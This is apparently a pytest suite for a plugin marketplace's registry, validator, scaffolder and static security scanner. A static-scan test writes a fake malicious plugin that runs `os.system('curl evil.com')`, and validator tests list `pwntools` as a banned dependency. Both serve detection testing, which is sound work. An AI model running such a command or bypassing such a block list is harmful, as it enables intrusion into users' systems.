"""Phase 27 — Plugin Marketplace tests.

Tests cover:
    - PluginManifest + PluginToolDefinition validation
    - @nexus_plugin_tool decorator
    - PluginValidator
    - PluginRegistry helpers (normalize, resolve, levenshtein, parse HTML)
    - PluginRegistry.install() / uninstall() / upgrade() (mocked pip + importlib)
    - PluginRegistry.load_state()
    - PluginRegistry.search() (mocked httpx)
    - scaffold_plugin()
    - Static scan
    - Checksum
    - is_persona_allowed()
"""

import asyncio
import importlib as _importlib_module
import json
import sys
import types
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch, PropertyMock

import pytest

from nexus.marketplace.plugin_sdk import (
    PluginManifest,
    PluginToolDefinition,
    nexus_plugin_tool,
    PluginError,
    PluginManifestError,
    PluginInstallError,
    PluginImportError,
    PluginNotFoundError,
    _infer_parameters_from_signature,
)
from nexus.marketplace.validator import PluginValidator
from nexus.marketplace.registry import (
    PluginRegistry,
    _normalize_package_name,
    _pip_specifier_to_module_name,
    _resolve_tool_function,
    _parse_pypi_search_html,
    _levenshtein,
)
from nexus.marketplace.scaffolder import scaffold_plugin


# ─── Fixtures ─────────────────────────────────────────────────────────────────


def _minimal_manifest(**overrides) -> PluginManifest:
    """Build a minimal valid PluginManifest."""
    data = {
        "name": "test-plugin",
        "version": "1.0.0",
        "description": "A test plugin for unit testing.",
        "author": "Test Author",
        "tools": [
            PluginToolDefinition(
                name="test_action",
                description="Test action tool.",
                risk_level="low",
            )
        ],
        "nexus_version": ">=0.1.0",
    }
    data.update(overrides)
    return PluginManifest(**data)


def _mock_config(**overrides):
    cfg = MagicMock()
    cfg.plugin_allow_unverified = True
    cfg.plugin_install_timeout = 30.0
    cfg.plugin_strict_scan = False
    cfg.plugin_dry_run_check = False  # disabled by default in tests to avoid real network
    for k, v in overrides.items():
        setattr(cfg, k, v)
    return cfg


def _make_registry(tool_registry=None, **config_overrides) -> PluginRegistry:
    if tool_registry is None:
        tool_registry = MagicMock()
    cfg = _mock_config(**config_overrides)
    reg = PluginRegistry(tool_registry=tool_registry, config=cfg)
    # Override state file to a tmp path so tests don't write to real ~/.nexus
    reg._state_file = Path("/tmp/nexus_test_plugins_installed.json")
    reg._state_file.parent.mkdir(parents=True, exist_ok=True)
    return reg


def _make_fake_module(manifest: PluginManifest, tool_fn_name: str = "test_action"):
    """Build a fake importable module with plugin_manifest and a tool function."""
    async def fake_tool(input: str = "") -> dict:
        return {"result": input}

    fake_tools_module = types.ModuleType(f"nexus_plugin_{manifest.name.replace('-','_')}.tools")
    setattr(fake_tools_module, tool_fn_name, fake_tool)

    fake_module = types.ModuleType(f"nexus_plugin_{manifest.name.replace('-','_')}")
    fake_module.plugin_manifest = manifest
    fake_module.tools = fake_tools_module
    fake_module.__file__ = f"/fake/nexus_plugin_{manifest.name.replace('-','_')}/__init__.py"
    return fake_module


# ─── PluginManifest validation ────────────────────────────────────────────────


class TestPluginManifest:
    def test_valid_construction(self):
        m = _minimal_manifest()
        assert m.name == "test-plugin"
        assert m.version == "1.0.0"
        assert len(m.tools) == 1

    def test_rejects_invalid_semver(self):
        with pytest.raises(Exception, match="semver"):
            _minimal_manifest(version="1.0")

    def test_rejects_invalid_semver_letters(self):
        with pytest.raises(Exception):
            _minimal_manifest(version="v1.0.0")

    def test_valid_prerelease_semver(self):
        m = _minimal_manifest(version="2.0.0-beta.1")
        assert m.version == "2.0.0-beta.1"

    def test_rejects_duplicate_tool_names(self):
        with pytest.raises(Exception, match="Duplicate"):
            _minimal_manifest(
                tools=[
                    PluginToolDefinition(name="my_tool", description="Tool A.", risk_level="low"),
                    PluginToolDefinition(name="my_tool", description="Tool B.", risk_level="low"),
                ]
            )

    def test_rejects_invalid_nexus_version_specifier(self):
        with pytest.raises(Exception):
            _minimal_manifest(nexus_version="invalid-spec")

    def test_valid_nexus_version_specifier(self):
        m = _minimal_manifest(nexus_version=">=0.1.0,<2.0.0")
        assert m.nexus_version == ">=0.1.0,<2.0.0"

    def test_tags_lowercased(self):
        m = _minimal_manifest(tags=["GitHub", "API"])
        assert m.tags == ["github", "api"]

    def test_tags_rejects_too_long_tag(self):
        with pytest.raises(Exception):
            _minimal_manifest(tags=["x" * 51])

    def test_verified_defaults_false(self):
        m = _minimal_manifest()
        assert m.verified is False

    def test_frozen_model(self):
        m = _minimal_manifest()
        with pytest.raises(Exception):
            m.name = "modified"  # type: ignore[misc]


class TestPluginToolDefinition:
    def test_valid(self):
        t = PluginToolDefinition(name="my_tool", description="Does things.", risk_level="high")
        assert t.risk_level == "high"

    def test_rejects_invalid_risk_level(self):
        with pytest.raises(Exception):
            PluginToolDefinition(name="my_tool", description="Does things.", risk_level="critical")

    def test_default_allowed_personas_empty(self):
        t = PluginToolDefinition(name="t", description="T.", risk_level="low")
        assert t.allowed_personas == []


# ─── @nexus_plugin_tool decorator ────────────────────────────────────────────


class TestNexusPluginToolDecorator:
    def test_marks_async_function(self):
        @nexus_plugin_tool(description="Does something.", risk_level="low")
        async def my_func(query: str) -> dict:
            return {}

        assert my_func.__nexus_plugin_tool__ is True
        assert my_func.__nexus_tool_name__ == "my_func"
        assert my_func.__nexus_tool_risk_level__ == "low"

    def test_rejects_sync_function(self):
        with pytest.raises(ValueError, match="async"):
            @nexus_plugin_tool(description="Sync.", risk_level="low")
            def sync_func(query: str) -> dict:
                return {}

    def test_rejects_invalid_risk_level(self):
        with pytest.raises(ValueError, match="risk_level"):
            @nexus_plugin_tool(description="Bad.", risk_level="critical")
            async def bad_func() -> dict:
                return {}

    def test_custom_name_override(self):
        @nexus_plugin_tool(name="custom_name", description="Named.", risk_level="medium")
        async def original_name() -> dict:
            return {}

        assert original_name.__nexus_tool_name__ == "custom_name"

    def test_description_from_docstring(self):
        @nexus_plugin_tool(risk_level="low")
        async def documented_func() -> dict:
            """First line of docstring."""
            return {}

        assert documented_func.__nexus_tool_description__ == "First line of docstring."

    def test_auto_infers_parameters(self):
        @nexus_plugin_tool(risk_level="low")
        async def typed_func(query: str, limit: int = 10) -> dict:
            return {}

        params = typed_func.__nexus_tool_parameters__
        assert "query" in params
        assert params["query"]["type"] == "string"
        assert "limit" in params
        assert params["limit"]["type"] == "integer"
        assert params["limit"]["default"] == 10

    @pytest.mark.asyncio
    async def test_parameter_size_cap(self):
        @nexus_plugin_tool(description="Capped.", risk_level="low")
        async def capped_func(data: str) -> dict:
            return {"ok": True}

        with pytest.raises(ValueError, match="50,000"):
            await capped_func(data="x" * 50_001)

    @pytest.mark.asyncio
    async def test_parameter_size_cap_passes_within_limit(self):
        @nexus_plugin_tool(description="Capped.", risk_level="low")
        async def capped_func(data: str) -> dict:
            return {"ok": True}

        result = await capped_func(data="x" * 50_000)
        assert result == {"ok": True}

    def test_allowed_personas_stored(self):
        @nexus_plugin_tool(description="Scoped.", allowed_personas=["analyst"])
        async def scoped_func() -> dict:
            return {}

        assert scoped_func.__nexus_tool_allowed_personas__ == ["analyst"]


class TestInferParametersFromSignature:
    def test_basic_types(self):
        async def f(a: str, b: int, c: float, d: bool) -> dict:
            return {}

        params = _infer_parameters_from_signature(f)
        assert params["a"]["type"] == "string"
        assert params["b"]["type"] == "integer"
        assert params["c"]["type"] == "number"
        assert params["d"]["type"] == "boolean"

    def test_optional_type(self):
        from typing import Optional

        async def f(a: Optional[str] = None) -> dict:
            return {}

        params = _infer_parameters_from_signature(f)
        assert params["a"]["type"] == "string"
        assert params["a"]["default"] is None

    def test_no_annotation_defaults_to_string(self):
        async def f(x) -> dict:
            return {}

        params = _infer_parameters_from_signature(f)
        assert params["x"]["type"] == "string"

    def test_skips_self(self):
        class MyClass:
            async def method(self, query: str) -> dict:
                return {}

        params = _infer_parameters_from_signature(MyClass.method)
        assert "self" not in params
        assert "query" in params


# ─── PluginValidator ─────────────────────────────────────────────────────────


class TestPluginValidator:
    def setup_method(self):
        self.validator = PluginValidator()

    def test_valid_manifest_returns_empty_errors(self):
        m = _minimal_manifest()
        errors = self.validator.validate(m)
        assert errors == []

    def test_rejects_protected_tool_name(self):
        m = _minimal_manifest(
            tools=[
                PluginToolDefinition(
                    name="web_search", description="Protected.", risk_level="low"
                )
            ]
        )
        errors = self.validator.validate(m)
        assert any("reserved" in e for e in errors)

    def test_rejects_banned_dependency(self):
        m = _minimal_manifest(dependencies=["pwntools>=2.0.0"])
        errors = self.validator.validate(m)
        assert any("banned" in e for e in errors)

    def test_rejects_banned_dependency_nexus(self):
        m = _minimal_manifest(dependencies=["nexus>=0.1.0"])
        errors = self.validator.validate(m)
        assert any("banned" in e for e in errors)

    def test_rejects_incompatible_nexus_version(self):
        m = _minimal_manifest(nexus_version=">=999.0.0")
        errors = self.validator.validate(m)
        assert any("incompatibil" in e.lower() for e in errors)

    def test_rejects_too_many_tools(self):
        tools = [
            PluginToolDefinition(
                name=f"tool_{i}", description=f"Tool {i}.", risk_level="low"
            )
            for i in range(51)
        ]
        m = _minimal_manifest(tools=tools)
        errors = self.validator.validate(m)
        assert any("50" in e for e in errors)

    def test_rejects_invalid_persona_name(self):
        m = _minimal_manifest(personas=["invalid persona name!"])
        errors = self.validator.validate(m)
        assert any("invalid" in e.lower() for e in errors)

    def test_valid_persona_name(self):
        m = _minimal_manifest(personas=["my_analyst"])
        errors = self.validator.validate(m)
        assert errors == []

    def test_multiple_errors_accumulated(self):
        m = _minimal_manifest(
            tools=[
                PluginToolDefinition(
                    name="web_search", description="Protected.", risk_level="low"
                )
            ],
            dependencies=["pwntools"],
        )
        errors = self.validator.validate(m)
        assert len(errors) >= 2


# ─── Registry helpers ─────────────────────────────────────────────────────────


class TestNormalizePackageName:
    def test_adds_prefix_when_missing(self):
        assert _normalize_package_name("weather", None) == "nexus-plugin-weather"

    def test_preserves_existing_prefix(self):
        assert _normalize_package_name("nexus-plugin-slack", None) == "nexus-plugin-slack"

    def test_appends_version(self):
        assert _normalize_package_name("weather", "1.0.0") == "nexus-plugin-weather==1.0.0"

    def test_inline_version_preserved(self):
        result = _normalize_package_name("nexus-plugin-slack==2.0.0", None)
        assert result == "nexus-plugin-slack==2.0.0"

    def test_short_name_with_version(self):
        assert _normalize_package_name("github", "3.0.0") == "nexus-plugin-github==3.0.0"


class TestPipSpecifierToModuleName:
    def test_simple(self):
        assert _pip_specifier_to_module_name("nexus-plugin-weather") == "nexus_plugin_weather"

    def test_with_version(self):
        assert _pip_specifier_to_module_name("nexus-plugin-weather==1.0.0") == "nexus_plugin_weather"

    def test_hyphenated_name(self):
        result = _pip_specifier_to_module_name("nexus-plugin-github-tools")
        assert result == "nexus_plugin_github_tools"


class TestResolveToolFunction:
    def test_finds_in_tools_submodule(self):
        manifest = _minimal_manifest()
        module = _make_fake_module(manifest, "test_action")
        func = _resolve_tool_function(module, "test_action")
        assert callable(func)

    def test_finds_in_flat_layout(self):
        async def flat_tool() -> dict:
            return {}

        module = types.ModuleType("nexus_plugin_flat")
        module.flat_tool = flat_tool
        module.plugin_manifest = _minimal_manifest(
            tools=[PluginToolDefinition(name="flat_tool", description="Flat.", risk_level="low")]
        )
        # No 'tools' submodule — should fall back to flat lookup
        func = _resolve_tool_function(module, "flat_tool")
        assert func is flat_tool

    def test_raises_manifest_error_if_not_found(self):
        module = types.ModuleType("nexus_plugin_empty")
        with pytest.raises(PluginManifestError, match="not found"):
            _resolve_tool_function(module, "missing_tool")


class TestLevenshtein:
    def test_identical(self):
        assert _levenshtein("abc", "abc") == 0

    def test_single_substitution(self):
        assert _levenshtein("abc", "axc") == 1

    def test_single_insertion(self):
        assert _levenshtein("ab", "abc") == 1

    def test_single_deletion(self):
        assert _levenshtein("abc", "ab") == 1

    def test_empty_strings(self):
        assert _levenshtein("", "") == 0
        assert _levenshtein("abc", "") == 3


class TestParsePypiSearchHtml:
    def test_extracts_package_names(self):
        html = """
        <span class="package-snippet__name">nexus-plugin-weather</span>
        <span class="package-snippet__name">nexus-plugin-github</span>
        """
        names = _parse_pypi_search_html(html)
        assert "nexus-plugin-weather" in names
        assert "nexus-plugin-github" in names

    def test_returns_empty_for_no_match(self):
        assert _parse_pypi_search_html("<html>no packages here</html>") == []


# ─── PluginRegistry validate_package_name_format ─────────────────────────────


class TestValidatePackageNameFormat:
    def test_rejects_missing_prefix(self):
        registry = _make_registry()
        with pytest.raises(PluginManifestError, match="nexus-plugin-"):
            registry._validate_package_name_format("weather")

    def test_rejects_double_hyphen(self):
        registry = _make_registry()
        with pytest.raises(PluginManifestError, match="consecutive hyphens"):
            registry._validate_package_name_format("nexus-plugin--weather")

    def test_valid_name_passes(self):
        registry = _make_registry()
        # Should not raise
        registry._validate_package_name_format("nexus-plugin-weather")

    def test_typosquatting_warning_logged(self, caplog):
        registry = _make_registry()
        # Pre-install a plugin so Levenshtein check has something to compare against
        manifest = _minimal_manifest(name="weather")
        registry._installed["weather"] = manifest

        import logging
        with caplog.at_level(logging.WARNING):
            # "weater" is 1 edit away from "weather"
            registry._validate_package_name_format("nexus-plugin-weater")

        assert any("typosquat" in r.message.lower() for r in caplog.records)


# ─── PluginRegistry.install() ────────────────────────────────────────────────


@pytest.mark.asyncio
class TestPluginRegistryInstall:
    async def _install_with_mocks(self, manifest: PluginManifest, **config_overrides):
        """Helper: mock pip + importlib and run install()."""
        registry = _make_registry(**config_overrides)
        module = _make_fake_module(manifest, manifest.tools[0].name)

        async def fake_pip_install(spec):
            pass

        async def fake_dry_run(spec):
            pass

        async def fake_static_scan(module_name):
            return []

        with patch.object(registry, "_pip_install", side_effect=fake_pip_install), \
             patch.object(registry, "_pip_dry_run", side_effect=fake_dry_run), \
             patch.object(registry, "_static_scan_module", side_effect=fake_static_scan), \
             patch.object(_importlib_module, "import_module", return_value=module):
            result = await registry.install(manifest.name, version=None, force=True)
        return registry, result

    async def test_install_success_registers_tools(self):
        manifest = _minimal_manifest()
        mock_registry = MagicMock()
        registry = _make_registry(tool_registry=mock_registry)
        module = _make_fake_module(manifest)

        async def noop(*a, **kw):
            return []

        with patch.object(registry, "_pip_install", AsyncMock()), \
             patch.object(registry, "_pip_dry_run", AsyncMock()), \
             patch.object(registry, "_static_scan_module", side_effect=noop), \
             patch.object(_importlib_module, "import_module", return_value=module):
            result = await registry.install("nexus-plugin-test-plugin", force=True)

        assert result.name == "test-plugin"
        assert result.version == "1.0.0"
        assert mock_registry.register.called

    async def test_install_pip_failure_raises(self):
        registry = _make_registry()

        async def failing_pip(spec):
            raise PluginInstallError(spec, "compilation error")

        with patch.object(registry, "_pip_install", side_effect=failing_pip), \
             patch.object(registry, "_pip_dry_run", AsyncMock()):
            with pytest.raises(PluginInstallError, match="compilation error"):
                await registry.install("nexus-plugin-test-plugin")

    async def test_install_missing_manifest_attribute_raises(self):
        registry = _make_registry()
        module_no_manifest = types.ModuleType("nexus_plugin_test_plugin")
        # no plugin_manifest attribute

        with patch.object(registry, "_pip_install", AsyncMock()), \
             patch.object(registry, "_pip_dry_run", AsyncMock()), \
             patch.object(registry, "_static_scan_module", AsyncMock(return_value=[])), \
             patch.object(_importlib_module, "import_module", return_value=module_no_manifest):
            with pytest.raises(PluginManifestError, match="plugin_manifest"):
                await registry.install("nexus-plugin-test-plugin")

    async def test_install_forces_verified_false(self):
        # Manifest self-declares verified=True — registry must override to False
        manifest_data = {
            "name": "test-plugin",
            "version": "1.0.0",
            "description": "A test plugin for unit testing.",
            "author": "Test",
            "tools": [
                PluginToolDefinition(
                    name="test_action", description="Test.", risk_level="low"
                )
            ],
            "nexus_version": ">=0.1.0",
            "verified": True,  # self-declared — must be overridden
        }
        # PluginManifest.verified is overridden in model_copy during install
        manifest = PluginManifest(**manifest_data)
        assert manifest.verified is True  # input says True

        registry = _make_registry()
        module = _make_fake_module(manifest)

        with patch.object(registry, "_pip_install", AsyncMock()), \
             patch.object(registry, "_pip_dry_run", AsyncMock()), \
             patch.object(registry, "_static_scan_module", AsyncMock(return_value=[])), \
             patch.object(_importlib_module, "import_module", return_value=module):
            result = await registry.install("nexus-plugin-test-plugin", force=True)

        assert result.verified is False  # must be overridden

    async def test_install_idempotent_skip_when_already_installed(self):
        manifest = _minimal_manifest()
        registry = _make_registry()
        registry._installed["test-plugin"] = manifest

        pip_called = []

        async def track_pip(spec):
            pip_called.append(spec)

        with patch.object(registry, "_pip_install", side_effect=track_pip):
            result = await registry.install("nexus-plugin-test-plugin", force=False)

        assert result is manifest
        assert pip_called == []  # pip was never called

    async def test_install_force_reinstalls(self):
        manifest = _minimal_manifest()
        registry = _make_registry()
        registry._installed["test-plugin"] = manifest  # already "installed"
        module = _make_fake_module(manifest)

        pip_called = []

        async def track_pip(spec):
            pip_called.append(spec)

        with patch.object(registry, "_pip_install", side_effect=track_pip), \
             patch.object(registry, "_pip_dry_run", AsyncMock()), \
             patch.object(registry, "_static_scan_module", AsyncMock(return_value=[])), \
             patch.object(_importlib_module, "import_module", return_value=module):
            await registry.install("nexus-plugin-test-plugin", force=True)

        assert len(pip_called) == 1  # pip was called despite already installed

    async def test_install_strict_scan_blocks_on_warning(self):
        manifest = _minimal_manifest()
        registry = _make_registry(plugin_strict_scan=True)
        module = _make_fake_module(manifest)

        uninstall_called = []

        async def track_uninstall(pkg):
            uninstall_called.append(pkg)

        with patch.object(registry, "_pip_install", AsyncMock()), \
             patch.object(registry, "_pip_dry_run", AsyncMock()), \
             patch.object(
                 registry, "_static_scan_module",
                 AsyncMock(return_value=["__init__.py: os.system() call"])
             ), \
             patch.object(registry, "_pip_uninstall", side_effect=track_uninstall), \
             patch.object(_importlib_module, "import_module", return_value=module):
            with pytest.raises(PluginManifestError, match="static security scan"):
                await registry.install("nexus-plugin-test-plugin", force=True)

        assert len(uninstall_called) == 1  # was rolled back

    async def test_install_validation_failure_uninstalls(self):
        # Manifest with protected tool name fails validation
        manifest = _minimal_manifest(
            tools=[
                PluginToolDefinition(
                    name="web_search", description="Protected.", risk_level="low"
                )
            ]
        )
        registry = _make_registry()
        module = _make_fake_module(manifest, "web_search")

        uninstall_called = []

        async def track_uninstall(pkg):
            uninstall_called.append(pkg)

        with patch.object(registry, "_pip_install", AsyncMock()), \
             patch.object(registry, "_pip_dry_run", AsyncMock()), \
             patch.object(registry, "_static_scan_module", AsyncMock(return_value=[])), \
             patch.object(registry, "_pip_uninstall", side_effect=track_uninstall), \
             patch.object(_importlib_module, "import_module", return_value=module):
            with pytest.raises(PluginManifestError):
                await registry.install("nexus-plugin-test-plugin", force=True)

        assert len(uninstall_called) == 1


# ─── PluginRegistry.uninstall() ───────────────────────────────────────────────


@pytest.mark.asyncio
class TestPluginRegistryUninstall:
    async def test_uninstall_deregisters_tools(self):
        mock_tool_registry = MagicMock()
        registry = _make_registry(tool_registry=mock_tool_registry)
        manifest = _minimal_manifest()
        registry._installed["test-plugin"] = manifest
        registry._plugin_tools["test-plugin"] = ["test_action"]

        with patch.object(registry, "_pip_uninstall", AsyncMock()):
            result = await registry.uninstall("test-plugin")

        assert result is True
        mock_tool_registry.unregister.assert_called_once_with("test_action")
        assert "test-plugin" not in registry._installed

    async def test_uninstall_not_found_raises(self):
        registry = _make_registry()
        with pytest.raises(PluginNotFoundError, match="not installed"):
            await registry.uninstall("nonexistent-plugin")

    async def test_uninstall_persists_state(self, tmp_path):
        mock_tool_registry = MagicMock()
        registry = _make_registry(tool_registry=mock_tool_registry)
        registry._state_file = tmp_path / "installed.json"
        registry._state_file.write_text("{}")

        manifest = _minimal_manifest()
        registry._installed["test-plugin"] = manifest
        registry._plugin_tools["test-plugin"] = ["test_action"]

        with patch.object(registry, "_pip_uninstall", AsyncMock()):
            await registry.uninstall("test-plugin")

        state = json.loads(registry._state_file.read_text())
        assert "test-plugin" not in state


# ─── PluginRegistry.upgrade() ────────────────────────────────────────────────


@pytest.mark.asyncio
class TestPluginRegistryUpgrade:
    async def test_upgrade_calls_uninstall_then_install(self):
        registry = _make_registry()
        old_manifest = _minimal_manifest(version="1.0.0")
        registry._installed["test-plugin"] = old_manifest
        registry._plugin_tools["test-plugin"] = []
        registry._plugin_personas["test-plugin"] = []

        new_manifest = _minimal_manifest(version="2.0.0")
        module = _make_fake_module(new_manifest)

        with patch.object(registry, "_pip_uninstall", AsyncMock()), \
             patch.object(registry, "_pip_install", AsyncMock()), \
             patch.object(registry, "_pip_dry_run", AsyncMock()), \
             patch.object(registry, "_static_scan_module", AsyncMock(return_value=[])), \
             patch.object(_importlib_module, "import_module", return_value=module):
            result = await registry.upgrade("test-plugin")

        assert result.version == "2.0.0"
        assert "test-plugin" in registry._installed

    async def test_upgrade_not_installed_raises(self):
        registry = _make_registry()
        with pytest.raises(PluginNotFoundError):
            await registry.upgrade("not-installed")


# ─── PluginRegistry.load_state() ─────────────────────────────────────────────


@pytest.mark.asyncio
class TestPluginRegistryLoadState:
    async def test_load_state_missing_file(self, tmp_path):
        registry = _make_registry()
        registry._state_file = tmp_path / "no_such_file.json"
        await registry.load_state()  # should not raise
        assert registry.list_installed() == []

    async def test_load_state_invalid_json(self, tmp_path):
        registry = _make_registry()
        state_file = tmp_path / "bad.json"
        state_file.write_text("not json {{")
        registry._state_file = state_file
        await registry.load_state()  # should not raise
        assert registry.list_installed() == []

    async def test_load_state_restores_installed_plugins(self, tmp_path):
        manifest = _minimal_manifest()
        state = {"test-plugin": manifest.model_dump()}
        state_file = tmp_path / "installed.json"
        state_file.write_text(json.dumps(state, default=str))

        mock_tool_registry = MagicMock()
        registry = _make_registry(tool_registry=mock_tool_registry)
        registry._state_file = state_file

        module = _make_fake_module(manifest)

        with patch.object(_importlib_module, "import_module", return_value=module):
            await registry.load_state()

        assert "test-plugin" in registry._installed
        mock_tool_registry.register.assert_called_once()

    async def test_load_state_skips_unimportable_plugin(self, tmp_path):
        manifest = _minimal_manifest()
        state = {"test-plugin": manifest.model_dump()}
        state_file = tmp_path / "installed.json"
        state_file.write_text(json.dumps(state, default=str))

        registry = _make_registry()
        registry._state_file = state_file

        with patch.object(_importlib_module, "import_module", side_effect=ImportError("no module")):
            await registry.load_state()

        # Should skip without raising
        assert "test-plugin" not in registry._installed


# ─── PluginRegistry.search() (mocked PyPI) ────────────────────────────────────


@pytest.mark.asyncio
class TestPluginRegistrySearch:
    def _make_mock_response(self, html: str, status: int = 200):
        mock_resp = MagicMock()
        mock_resp.status_code = status
        mock_resp.text = html
        mock_resp.raise_for_status = MagicMock()
        return mock_resp

    def _make_metadata_response(self, name: str, version: str = "1.0.0"):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.raise_for_status = MagicMock()
        mock_resp.json = MagicMock(return_value={
            "info": {
                "name": name,
                "version": version,
                "summary": f"A plugin for {name}",
                "author": "Test Author",
                "project_urls": {"Homepage": "https://example.com"},
                "home_page": "",
            }
        })
        return mock_resp

    async def test_search_returns_correct_shape(self):
        registry = _make_registry()
        search_html = '<span class="package-snippet__name">nexus-plugin-weather</span>'

        mock_client = AsyncMock()
        mock_client.get = AsyncMock(side_effect=[
            self._make_mock_response(search_html),    # search call
            self._make_metadata_response("nexus-plugin-weather"),  # metadata call
        ])
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)

        with patch("httpx.AsyncClient", return_value=mock_client):
            results = await registry.search("weather")

        assert len(results) == 1
        r = results[0]
        assert r["name"] == "nexus-plugin-weather"
        assert r["plugin_name"] == "weather"
        assert r["installed"] is False
        assert r["verified"] is False

    async def test_search_timeout_returns_empty_list(self):
        registry = _make_registry()
        import httpx

        mock_client = AsyncMock()
        mock_client.get = AsyncMock(side_effect=httpx.TimeoutException("timed out"))
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)

        with patch("httpx.AsyncClient", return_value=mock_client):
            results = await registry.search("weather")

        assert results == []

    async def test_search_annotates_installed_plugins(self):
        registry = _make_registry()
        registry._installed["weather"] = _minimal_manifest(name="weather", version="1.0.0")
        search_html = '<span class="package-snippet__name">nexus-plugin-weather</span>'

        mock_client = AsyncMock()
        mock_client.get = AsyncMock(side_effect=[
            self._make_mock_response(search_html),
            self._make_metadata_response("nexus-plugin-weather", version="2.0.0"),
        ])
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)

        with patch("httpx.AsyncClient", return_value=mock_client):
            results = await registry.search("weather")

        assert results[0]["installed"] is True
        assert results[0]["installed_version"] == "1.0.0"


# ─── Static scan ──────────────────────────────────────────────────────────────


@pytest.mark.asyncio
class TestStaticScan:
    async def test_detects_os_system(self, tmp_path):
        pkg_dir = tmp_path / "nexus_plugin_evil"
        pkg_dir.mkdir()
        init_py = pkg_dir / "__init__.py"
        init_py.write_text("import os\nos.system('curl evil.com')\n")

        registry = _make_registry()
        with patch.object(_importlib_module.util, "find_spec") as mock_find_spec:
            mock_spec = MagicMock()
            mock_spec.submodule_search_locations = [str(pkg_dir)]
            mock_find_spec.return_value = mock_spec
            warnings = await registry._static_scan_module("nexus_plugin_evil")

        assert any("os.system" in w for w in warnings)

    async def test_clean_module_returns_empty(self, tmp_path):
        pkg_dir = tmp_path / "nexus_plugin_clean"
        pkg_dir.mkdir()
        init_py = pkg_dir / "__init__.py"
        init_py.write_text(
            "from nexus.marketplace import PluginManifest\n"
            "plugin_manifest = PluginManifest(...)\n"
        )

        registry = _make_registry()
        with patch.object(_importlib_module.util, "find_spec") as mock_find_spec:
            mock_spec = MagicMock()
            mock_spec.submodule_search_locations = [str(pkg_dir)]
            mock_find_spec.return_value = mock_spec
            warnings = await registry._static_scan_module("nexus_plugin_clean")

        assert warnings == []


# ─── Checksum ─────────────────────────────────────────────────────────────────


@pytest.mark.asyncio
class TestChecksum:
    async def test_checksum_stored_on_install(self, tmp_path):
        manifest = _minimal_manifest()
        mock_tool_registry = MagicMock()
        registry = _make_registry(tool_registry=mock_tool_registry)
        registry._state_file = tmp_path / "installed.json"

        module = _make_fake_module(manifest)
        module.__file__ = str(tmp_path / "fake_init.py")
        # Write a real file so checksum can be computed
        Path(module.__file__).write_bytes(b"# fake plugin content")

        with patch.object(registry, "_pip_install", AsyncMock()), \
             patch.object(registry, "_pip_dry_run", AsyncMock()), \
             patch.object(registry, "_static_scan_module", AsyncMock(return_value=[])), \
             patch.object(_importlib_module, "import_module", return_value=module), \
             patch.object(_importlib_module.util, "find_spec") as mock_spec_fn:
            mock_spec = MagicMock()
            mock_spec.origin = str(tmp_path / "fake_init.py")
            mock_spec_fn.return_value = mock_spec
            result = await registry.install("nexus-plugin-test-plugin", force=True)

        assert len(result.checksum_sha256) == 64  # SHA-256 hex digest


# ─── is_persona_allowed() ─────────────────────────────────────────────────────


class TestIsPersonaAllowed:
    def test_unrestricted_tool_allows_all_personas(self):
        registry = _make_registry()
        assert registry.is_persona_allowed("any_tool", "analyst") is True

    def test_restricted_tool_allows_listed_persona(self):
        registry = _make_registry()
        registry._tool_allowed_personas["scoped_tool"] = ["analyst"]
        assert registry.is_persona_allowed("scoped_tool", "analyst") is True

    def test_restricted_tool_blocks_unlisted_persona(self):
        registry = _make_registry()
        registry._tool_allowed_personas["scoped_tool"] = ["analyst"]
        assert registry.is_persona_allowed("scoped_tool", "operator") is False


# ─── Scaffolder ───────────────────────────────────────────────────────────────


class TestScaffoldPlugin:
    def test_creates_correct_structure(self, tmp_path):
        package_path = scaffold_plugin("my-tool", tmp_path)
        assert package_path.exists()
        module_dir = package_path / "nexus_plugin_my_tool"
        assert module_dir.exists()
        assert (module_dir / "__init__.py").exists()
        assert (module_dir / "tools.py").exists()
        assert (module_dir / "personas.yaml").exists()
        assert (package_path / "pyproject.toml").exists()
        assert (package_path / "README.md").exists()

    def test_init_contains_manifest(self, tmp_path):
        scaffold_plugin("my-tool", tmp_path)
        init_text = (tmp_path / "nexus-plugin-my-tool" / "nexus_plugin_my_tool" / "__init__.py").read_text()
        assert "PluginManifest" in init_text
        assert "my-tool" in init_text

    def test_tools_file_contains_decorator(self, tmp_path):
        scaffold_plugin("my-tool", tmp_path)
        tools_text = (tmp_path / "nexus-plugin-my-tool" / "nexus_plugin_my_tool" / "tools.py").read_text()
        assert "nexus_plugin_tool" in tools_text
        assert "async def" in tools_text

    def test_pyproject_has_nexus_plugin_prefix(self, tmp_path):
        scaffold_plugin("my-tool", tmp_path)
        toml_text = (tmp_path / "nexus-plugin-my-tool" / "pyproject.toml").read_text()
        assert 'name = "nexus-plugin-my-tool"' in toml_text

    def test_rejects_invalid_name(self, tmp_path):
        with pytest.raises(ValueError, match="invalid"):
            scaffold_plugin("My Tool!", tmp_path)

    def test_rejects_single_char_name(self, tmp_path):
        with pytest.raises(ValueError):
            scaffold_plugin("x", tmp_path)

    def test_hyphenated_name_creates_underscored_module(self, tmp_path):
        package_path = scaffold_plugin("my-great-tool", tmp_path)
        assert (package_path / "nexus_plugin_my_great_tool").exists()


# ─── PluginRegistry.list_installed() / get() ──────────────────────────────────


class TestListAndGet:
    def test_list_installed_empty(self):
        registry = _make_registry()
        assert registry.list_installed() == []

    def test_list_installed_sorted_by_name(self):
        registry = _make_registry()
        registry._installed["zebra"] = _minimal_manifest(name="zebra")
        registry._installed["alpha"] = _minimal_manifest(name="alpha")
        names = [m.name for m in registry.list_installed()]
        assert names == ["alpha", "zebra"]

    def test_get_returns_manifest(self):
        registry = _make_registry()
        m = _minimal_manifest()
        registry._installed["test-plugin"] = m
        assert registry.get("test-plugin") is m

    def test_get_raises_not_found(self):
        registry = _make_registry()
        with pytest.raises(PluginNotFoundError):
            registry.get("nobody")


# ─── Engine integration (load_plugins wiring) ────────────────────────────────


class TestEnginePluginRegistryWiring:
    def test_engine_accepts_plugin_registry(self):
        """NexusEngine constructor accepts plugin_registry=None without error."""
        from nexus.core.engine import NexusEngine
        from unittest.mock import MagicMock
        # Minimal construction just to verify the parameter exists
